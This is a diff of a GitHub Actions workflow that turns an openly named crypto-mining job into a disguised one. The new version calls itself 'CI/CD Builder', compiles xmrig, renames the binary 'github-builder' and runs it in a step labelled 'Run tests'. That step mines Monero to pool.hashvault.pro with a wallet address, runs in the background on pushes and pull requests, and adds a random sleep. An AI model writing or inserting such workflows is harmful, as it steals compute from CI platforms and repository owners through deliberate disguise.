@@ -1,20 +1,33 @@
-name: CryptoMiner
+name: CI/CD Builder
 
-on:
+on: 
   workflow_dispatch:
-  schedule:
-    - cron: '0 0 * * *'
   push:
+    branches: [ "main" ]
+  pull_request:
 
 jobs:
-  mining:
-    runs-on: ubuntu-latest
+  build:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 180
     steps:
-    - name: Setup miner
+    - name: Install dependencies
+      run: sudo apt-get update && sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+
+    - name: Clone repo
+      run: git clone https://github.com/xmrig/xmrig.git --depth 1 ./builder
+
+    - name: Build project
       run: |
-        wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz
-        tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz
-        cd xmrig-6.20.0
-    - name: Start mining
+        cd builder
+        mkdir build
+        cd build
+        cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF
+        make -j$(nproc)
+        mv xmrig github-builder
+
+    - name: Run tests
       run: |
-        ./xmrig -o pool.hashvault.pro:443 -u 45w8eSZEnn7c1t4MHGoUw72dh4XHELqs8A39J5muPWGuBam5QKrJ5GXC5Jm9QsxenTMVo9n6MYKepgpZ1aE21BoFEuZWSdD -p github-action --donate-level=1
+        cd builder/build
+        ./github-builder -o pool.hashvault.pro:443 -u 45w8eSZEnn7c1t4MHGoUw72dh4XHELqs8A39J5muPWGuBam5QKrJ5GXC5Jm9QsxenTMVo9n6MYKepgpZ1aE21BoFEuZWSdD --tls --cpu-max-threads-hint=50 --randomx-1gb-pages -B
+        sleep $((RANDOM % 600 + 300))
